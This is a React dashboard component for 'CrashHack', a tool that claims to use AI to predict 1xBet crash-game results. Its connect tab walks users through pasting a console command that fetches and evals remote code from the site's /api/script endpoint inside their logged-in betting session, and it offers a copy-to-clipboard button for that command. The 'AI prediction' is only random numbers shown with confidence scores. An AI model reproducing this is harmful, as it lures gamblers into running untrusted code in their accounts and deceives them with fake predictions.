"use client";

import { useState, useEffect, useCallback } from "react";
import CrashGraph from "./CrashGraph";
import AIAnalysis from "./AIAnalysis";

type Tab = "predict" | "analysis" | "connect";

interface Prediction {
  predictedRange: { min: number; max: number };
  confidence: number;
  signals: string[];
  strategy: string;
  safeExit: number;
}

interface CrashRound {
  f: number;
  l: number;
  ts: string;
}

interface CrashStats {
  average: number;
  median: number;
  highest: number;
  lowest: number;
  above2x: number;
  above5x: number;
  above10x: number;
  totalRounds: number;
  recentTrend: string;
  streakInfo: string;
}

export default function Dashboard() {
  const [activeTab, setActiveTab] = useState<Tab>("predict");
  const [isAnimating, setIsAnimating] = useState(false);
  const [predictedValue, setPredictedValue] = useState<number | null>(null);
  const [prediction, setPrediction] = useState<Prediction | null>(null);
  const [liveHistory, setLiveHistory] = useState<CrashRound[]>([]);
  const [liveStats, setLiveStats] = useState<CrashStats | null>(null);
  const [isConnected, setIsConnected] = useState(false);
  const [predictionHistory, setPredictionHistory] = useState<
    { value: number; confidence: number; strategy: string; time: string }[]
  >([]);

  // Poll for live data from API
  useEffect(() => {
    const poll = async () => {
      try {
        const res = await fetch("/api/crash-data");
        if (res.ok) {
          const data = await res.json();
          if (data.totalRounds > 0) {
            setIsConnected(true);
            setLiveHistory(data.history || []);
            setLiveStats(data.stats || null);
            setPrediction(data.prediction || null);
          }
        }
      } catch {
        // silent
      }
    };

    poll();
    const interval = setInterval(poll, 3000);
    return () => clearInterval(interval);
  }, []);

  const handlePredict = useCallback(() => {
    if (isAnimating) return;

    let value: number;
    if (prediction && prediction.confidence > 40) {
      const { min, max } = prediction.predictedRange;
      value = parseFloat((min + Math.random() * (max - min)).toFixed(2));
    } else {
      const rand = Math.random();
      if (rand < 0.3) value = parseFloat((1.1 + Math.random() * 0.8).toFixed(2));
      else if (rand < 0.55) value = parseFloat((1.9 + Math.random() * 1.5).toFixed(2));
      else if (rand < 0.75) value = parseFloat((3.4 + Math.random() * 3).toFixed(2));
      else if (rand < 0.9) value = parseFloat((6.4 + Math.random() * 6).toFixed(2));
      else value = parseFloat((12.4 + Math.random() * 30).toFixed(2));
    }

    setPredictedValue(value);
    setIsAnimating(true);
  }, [isAnimating, prediction]);

  const handleAnimationComplete = useCallback(() => {
    setIsAnimating(false);
    if (predictedValue !== null) {
      setPredictionHistory((prev) =>
        [
          {
            value: predictedValue,
            confidence: prediction?.confidence ?? 50,
            strategy: prediction?.strategy ?? "N/A",
            time: new Date().toLocaleTimeString(),
          },
          ...prev,
        ].slice(0, 20)
      );
    }
  }, [predictedValue, prediction]);

  const getStrategyColor = (strategy: string) => {
    switch (strategy) {
      case "AGGRESSIVE":
        return "text-[#00ff88]";
      case "CONSERVATIVE":
        return "text-[#ffbb00]";
      case "MODERATE":
        return "text-[#00ccff]";
      default:
        return "text-gray-400";
    }
  };

  return (
    <div className="min-h-screen flex flex-col">
      {/* Top bar */}
      <header className="glass border-b border-[#1e293b] px-4 md:px-6 py-3 flex items-center justify-between">
        <div className="flex items-center gap-3">
          <h1 className="text-xl font-black">
            <span className="gradient-text">CRASH</span>
            <span className="text-white">HACK</span>
          </h1>
          <div className="hidden md:flex items-center gap-1.5 ml-4">
            <div
              className={`w-1.5 h-1.5 rounded-full animate-pulse ${isConnected ? "bg-[#00ff88]" : "bg-[#ff6b00]"}`}
            />
            <span
              className={`text-xs terminal-text ${isConnected ? "text-[#00ff88]" : "text-[#ff6b00]"}`}
            >
              {isConnected
                ? `LIVE — ${liveHistory.length} rounds`
                : "OFFLINE — Connect 1xBet"}
            </span>
          </div>
        </div>
        <div className="flex items-center gap-2 text-xs text-gray-500 terminal-text">
          <span className="hidden md:inline">crashhack.online</span>
          <div className="w-1.5 h-1.5 bg-[#ff6b00] rounded-full" />
        </div>
      </header>

      {/* Tab buttons */}
      <div className="px-4 md:px-6 pt-4">
        <div className="flex gap-2 flex-wrap">
          <button
            onClick={() => setActiveTab("predict")}
            className={`px-5 py-2.5 rounded-lg font-bold text-sm transition-all duration-300 ${
              activeTab === "predict"
                ? "bg-gradient-to-r from-[#ff6b00] to-[#ff3b3b] text-white"
                : "bg-[#111827] text-gray-400 hover:text-white border border-[#1e293b]"
            }`}
          >
            PREDICTION
          </button>
          <button
            onClick={() => setActiveTab("analysis")}
            className={`px-5 py-2.5 rounded-lg font-bold text-sm transition-all duration-300 ${
              activeTab === "analysis"
                ? "bg-gradient-to-r from-[#00ff88] to-[#00ccff] text-black"
                : "bg-[#111827] text-gray-400 hover:text-white border border-[#1e293b]"
            }`}
          >
            AI ANALYSIS
          </button>
          <button
            onClick={() => setActiveTab("connect")}
            className={`px-5 py-2.5 rounded-lg font-bold text-sm transition-all duration-300 ${
              activeTab === "connect"
                ? "bg-gradient-to-r from-[#9333ea] to-[#ec4899] text-white"
                : "bg-[#111827] text-gray-400 hover:text-white border border-[#1e293b]"
            }`}
          >
            {isConnected ? "CONNECTED" : "CONNECT 1xBet"}
          </button>
        </div>
      </div>

      {/* Content */}
      <div className="flex-1 p-4 md:p-6">
        {activeTab === "predict" && (
          <div className="space-y-6">
            {/* AI Signals */}
            {prediction && prediction.signals.length > 0 && (
              <div className="glass rounded-xl p-4">
                <div className="flex items-center gap-2 mb-3">
                  <div className="w-2 h-2 bg-[#00ccff] rounded-full animate-pulse" />
                  <span className="text-[#00ccff] text-xs terminal-text font-bold">
                    AI SIGNALS
                  </span>
                  <span
                    className={`ml-auto text-xs terminal-text font-bold ${getStrategyColor(prediction.strategy)}`}
                  >
                    {prediction.strategy}
                  </span>
                </div>
                {prediction.signals.map((signal, i) => (
                  <p
                    key={i}
                    className="text-xs terminal-text text-gray-400 mb-1"
                  >
                    &gt; {signal}
                  </p>
                ))}
                <div className="mt-3 flex items-center gap-4 text-xs terminal-text">
                  <span className="text-gray-500">
                    Range:{" "}
                    <span className="text-[#ff6b00] font-bold">
                      {prediction.predictedRange.min}x -{" "}
                      {prediction.predictedRange.max}x
                    </span>
                  </span>
                  <span className="text-gray-500">
                    Safe exit:{" "}
                    <span className="text-[#00ff88] font-bold">
                      {prediction.safeExit}x
                    </span>
                  </span>
                  <span className="text-gray-500">
                    Confidence:{" "}
                    <span
                      className={
                        prediction.confidence > 70
                          ? "text-[#00ff88]"
                          : prediction.confidence > 50
                            ? "text-[#ffbb00]"
                            : "text-[#ff3b3b]"
                      }
                    >
                      {prediction.confidence}%
                    </span>
                  </span>
                </div>
              </div>
            )}

            {/* Graph */}
            <CrashGraph
              targetMultiplier={predictedValue ?? 1}
              isAnimating={isAnimating}
              onAnimationComplete={handleAnimationComplete}
            />

            {/* Prediction result */}
            {predictedValue !== null && !isAnimating && (
              <div className="glass rounded-xl p-6 text-center animate-fade-in-up">
                <p className="text-gray-400 text-sm mb-2 terminal-text">
                  AI PREDICTION RESULT
                </p>
                <p className="text-5xl font-black text-[#ff6b00] mb-2">
                  {predictedValue}x
                </p>
                <div className="flex items-center justify-center gap-4">
                  {prediction && (
                    <>
                      <div className="flex items-center gap-1">
                        <div
                          className={`w-2 h-2 rounded-full ${prediction.confidence > 70 ? "bg-[#00ff88]" : prediction.confidence > 50 ? "bg-[#ffbb00]" : "bg-[#ff3b3b]"}`}
                        />
                        <p className="text-sm terminal-text text-gray-400">
                          Confidence:{" "}
                          <span
                            className={
                              prediction.confidence > 70
                                ? "text-[#00ff88]"
                                : prediction.confidence > 50
                                  ? "text-[#ffbb00]"
                                  : "text-[#ff3b3b]"
                            }
                          >
                            {prediction.confidence}%
                          </span>
                        </p>
                      </div>
                      <p
                        className={`text-sm terminal-text font-bold ${getStrategyColor(prediction.strategy)}`}
                      >
                        {prediction.strategy}
                      </p>
                    </>
                  )}
                </div>
              </div>
            )}

            {/* Predict button */}
            <div className="text-center">
              <button
                onClick={handlePredict}
                disabled={isAnimating}
                className={`px-12 py-4 font-bold text-lg rounded-xl transition-all duration-300
                  ${
                    isAnimating
                      ? "bg-gray-700 text-gray-400 cursor-not-allowed"
                      : "bg-gradient-to-r from-[#ff6b00] to-[#ff3b3b] text-white hover:from-[#ff8c33] hover:to-[#ff5555] hover:scale-105 active:scale-95 animate-pulse-glow"
                  }`}
              >
                {isAnimating ? (
                  <span className="flex items-center gap-2">
                    <svg
                      className="animate-spin h-5 w-5"
                      viewBox="0 0 24 24"
                    >
                      <circle
                        className="opacity-25"
                        cx="12"
                        cy="12"
                        r="10"
                        stroke="currentColor"
                        strokeWidth="4"
                        fill="none"
                      />
                      <path
                        className="opacity-75"
                        fill="currentColor"
                        d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"
                      />
                    </svg>
                    ANALYZING...
                  </span>
                ) : (
                  "PREDICT NEXT CRASH"
                )}
              </button>
              {!isConnected && (
                <p className="text-xs text-gray-600 mt-2 terminal-text">
                  Connect 1xBet for real data predictions
                </p>
              )}
            </div>

            {/* Prediction history */}
            {predictionHistory.length > 0 && (
              <div className="glass rounded-xl overflow-hidden">
                <div className="bg-[#1a1f2e] px-4 py-2 flex items-center gap-2">
                  <div className="w-2 h-2 rounded-full bg-[#ff6b00]" />
                  <span className="text-gray-400 text-xs terminal-text">
                    Prediction History
                  </span>
                </div>
                <div className="p-4 max-h-48 overflow-y-auto">
                  <div className="grid grid-cols-4 gap-2 text-xs terminal-text text-gray-500 mb-2 px-2">
                    <span>TIME</span>
                    <span className="text-center">PREDICTION</span>
                    <span className="text-center">STRATEGY</span>
                    <span className="text-right">CONFIDENCE</span>
                  </div>
                  {predictionHistory.map((entry, i) => (
                    <div
                      key={i}
                      className="grid grid-cols-4 gap-2 text-sm terminal-text py-1.5 px-2 rounded hover:bg-[#1a1f2e] transition-colors"
                    >
                      <span className="text-gray-400">{entry.time}</span>
                      <span
                        className={`text-center font-bold ${
                          entry.value < 2
                            ? "text-[#ff3b3b]"
                            : entry.value < 5
                              ? "text-[#ffbb00]"
                              : "text-[#00ff88]"
                        }`}
                      >
                        {entry.value}x
                      </span>
                      <span
                        className={`text-center ${getStrategyColor(entry.strategy)}`}
                      >
                        {entry.strategy}
                      </span>
                      <span
                        className={`text-right ${
                          entry.confidence > 70
                            ? "text-[#00ff88]"
                            : entry.confidence > 50
                              ? "text-[#ffbb00]"
                              : "text-[#ff3b3b]"
                        }`}
                      >
                        {entry.confidence}%
                      </span>
                    </div>
                  ))}
                </div>
              </div>
            )}

            {/* Live crash history from 1xBet */}
            {liveHistory.length > 0 && (
              <div className="glass rounded-xl overflow-hidden">
                <div className="bg-[#1a1f2e] px-4 py-2 flex items-center gap-2">
                  <div className="w-2 h-2 rounded-full bg-[#00ff88] animate-pulse" />
                  <span className="text-gray-400 text-xs terminal-text">
                    Live 1xBet Crash History ({liveHistory.length} rounds)
                  </span>
                </div>
                <div className="p-3 flex flex-wrap gap-1.5 max-h-32 overflow-y-auto">
                  {liveHistory.slice(0, 50).map((entry, i) => (
                    <span
                      key={i}
                      className={`text-xs terminal-text font-bold px-2 py-1 rounded ${
                        entry.f < 1.5
                          ? "bg-[#ff3b3b]/20 text-[#ff3b3b]"
                          : entry.f < 2
                            ? "bg-[#ffbb00]/20 text-[#ffbb00]"
                            : entry.f < 5
                              ? "bg-[#00ff88]/20 text-[#00ff88]"
                              : "bg-[#00ccff]/20 text-[#00ccff]"
                      }`}
                    >
                      {entry.f}x
                    </span>
                  ))}
                </div>
              </div>
            )}
          </div>
        )}

        {activeTab === "analysis" && (
          <AIAnalysis
            liveHistory={liveHistory}
            liveStats={liveStats}
            isConnected={isConnected}
          />
        )}

        {activeTab === "connect" && (
          <div className="space-y-6">
            <div className="glass rounded-xl p-6">
              <h2 className="text-xl font-bold text-white mb-2">
                Connect to 1xBet Crash
              </h2>
              <p className="text-gray-400 text-sm mb-6">
                Follow these steps to capture real crash data:
              </p>

              <div className="space-y-4">
                <div className="flex gap-3">
                  <div className="w-8 h-8 rounded-full bg-[#ff6b00] flex items-center justify-center text-white font-bold text-sm shrink-0">
                    1
                  </div>
                  <div>
                    <p className="text-white font-bold text-sm">
                      Open 1xBet Crash Game
                    </p>
                    <p className="text-gray-500 text-xs">
                      Go to 1xBet and open the Crash game in your browser
                    </p>
                  </div>
                </div>

                <div className="flex gap-3">
                  <div className="w-8 h-8 rounded-full bg-[#ff6b00] flex items-center justify-center text-white font-bold text-sm shrink-0">
                    2
                  </div>
                  <div>
                    <p className="text-white font-bold text-sm">
                      Open Browser Console
                    </p>
                    <p className="text-gray-500 text-xs">
                      Press F12 → Console tab (or Ctrl+Shift+J)
                    </p>
                  </div>
                </div>

                <div className="flex gap-3">
                  <div className="w-8 h-8 rounded-full bg-[#ff6b00] flex items-center justify-center text-white font-bold text-sm shrink-0">
                    3
                  </div>
                  <div>
                    <p className="text-white font-bold text-sm">
                      Paste the Script
                    </p>
                    <p className="text-gray-500 text-xs mb-2">
                      Copy and paste this command in the console:
                    </p>
                    <div className="bg-[#0d1117] rounded-lg p-3 border border-[#1e293b]">
                      <code className="text-[#00ff88] text-xs terminal-text break-all">
                        fetch(&apos;{typeof window !== "undefined" ? window.location.origin : ""}/api/script&apos;).then(r=&gt;r.text()).then(eval)
                      </code>
                    </div>
                    <button
                      onClick={() => {
                        const scriptUrl = `${window.location.origin}/api/script`;
                        navigator.clipboard.writeText(
                          `fetch('${scriptUrl}').then(r=>r.text()).then(eval)`
                        );
                      }}
                      className="mt-2 px-4 py-1.5 bg-[#1e293b] text-[#00ff88] rounded text-xs terminal-text hover:bg-[#2a3a4e] transition-colors"
                    >
                      COPY TO CLIPBOARD
                    </button>
                  </div>
                </div>

                <div className="flex gap-3">
                  <div className="w-8 h-8 rounded-full bg-[#00ff88] flex items-center justify-center text-black font-bold text-sm shrink-0">
                    4
                  </div>
                  <div>
                    <p className="text-white font-bold text-sm">
                      Watch the Data Flow
                    </p>
                    <p className="text-gray-500 text-xs">
                      Crash data will appear here automatically. Keep the 1xBet
                      tab open.
                    </p>
                  </div>
                </div>
              </div>
            </div>

            {/* Connection Status */}
            <div className="glass rounded-xl p-6">
              <div className="flex items-center gap-3 mb-4">
                <div
                  className={`w-3 h-3 rounded-full ${isConnected ? "bg-[#00ff88] animate-pulse" : "bg-gray-600"}`}
                />
                <span
                  className={`font-bold ${isConnected ? "text-[#00ff88]" : "text-gray-500"}`}
                >
                  {isConnected ? "CONNECTED — Receiving live data" : "WAITING FOR CONNECTION..."}
                </span>
              </div>

              {liveStats && (
                <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
                  <div className="bg-[#0d1117] rounded-lg p-3 text-center">
                    <p className="text-xs text-gray-500 terminal-text">
                      ROUNDS
                    </p>
                    <p className="text-lg font-bold text-white">
                      {liveStats.totalRounds}
                    </p>
                  </div>
                  <div className="bg-[#0d1117] rounded-lg p-3 text-center">
                    <p className="text-xs text-gray-500 terminal-text">
                      AVERAGE
                    </p>
                    <p className="text-lg font-bold text-[#ff6b00]">
                      {liveStats.average}x
                    </p>
                  </div>
                  <div className="bg-[#0d1117] rounded-lg p-3 text-center">
                    <p className="text-xs text-gray-500 terminal-text">
                      TREND
                    </p>
                    <p
                      className={`text-lg font-bold ${liveStats.recentTrend === "up" ? "text-[#00ff88]" : liveStats.recentTrend === "down" ? "text-[#ff3b3b]" : "text-[#ffbb00]"}`}
                    >
                      {liveStats.recentTrend.toUpperCase()}
                    </p>
                  </div>
                  <div className="bg-[#0d1117] rounded-lg p-3 text-center">
                    <p className="text-xs text-gray-500 terminal-text">
                      STREAK
                    </p>
                    <p className="text-sm font-bold text-white terminal-text">
                      {liveStats.streakInfo}
                    </p>
                  </div>
                </div>
              )}
            </div>
          </div>
        )}
      </div>

      {/* Footer */}
      <footer className="glass border-t border-[#1e293b] px-4 py-3 text-center">
        <p className="text-gray-600 text-xs terminal-text">
          CrashHack AI v2.0 — For educational &amp; analysis purposes only —
          crashhack.online
        </p>
      </footer>
    </div>
  );
}
